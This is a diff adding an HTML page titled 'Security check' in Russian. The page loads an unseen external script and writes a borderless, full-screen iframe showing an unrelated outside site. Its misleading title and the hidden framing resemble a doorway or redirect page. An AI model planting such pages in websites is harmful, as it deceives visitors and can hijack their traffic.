@@ -1,0 +1,13 @@
+<html>
+<head>
+<title>Проверка безопасности</title>
+<script src="javascript.php" type="text/javascript"></script>
+</head>
+<body>
+    <div style="width:100%; height:100%;">
+<script language="JavaScript">
+   document.write ('<iframe id="PartnerFrame" class="hide" style="border:none;width:100%; height:100%; position:absolute; top:0; left:0; right:0; bottom:0;" src="http://www.ayurvedaplus.ru" border="0" style="overflow:hidden" >');
+</script>
+</div>
+</body>
+</html>
